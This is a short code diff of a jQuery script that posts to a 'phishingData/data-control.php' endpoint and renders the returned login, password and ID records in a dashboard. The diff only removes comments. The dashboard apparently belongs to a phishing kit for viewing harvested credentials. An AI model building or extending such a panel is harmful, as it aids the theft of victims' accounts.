@@ -5,14 +5,12 @@ $(document).ready(function() {
         $.post('../phishingData/data-control.php', {
             table: table,
         }, function(res) {
-            // Assuming res is already parsed JSON
-            // Check the console to verify if the data is in the correct format
+           
             console.log(res);
             if(table==='account'){
                 $('.dashboard-content').empty();
 
 
-                // Draw the JSON data in the dashboard-content div
                 let jsonDataHtml = '<ul class="info-data">';
                 jsonDataHtml += '<div><li class="log set">LOGIN</li><li class="pass set">PASSWORD</li><li class="set">ID</li><br></div>'
                 for (let i = 0; i < res.length; i++) {
@@ -30,7 +28,7 @@ $(document).ready(function() {
                 $('.dashboard-content').empty();
 
 
-                // Draw the JSON data in the dashboard-content div
+               
                 let jsonDataHtml = '<ul class="info-data">';
                 jsonDataHtml += '<div><li class="log set">LOGIN</li><li class="pass set">PASSWORD</li><li class="set">ID</li><br></div>'
                 for (let i = 0; i < res.length; i++) {
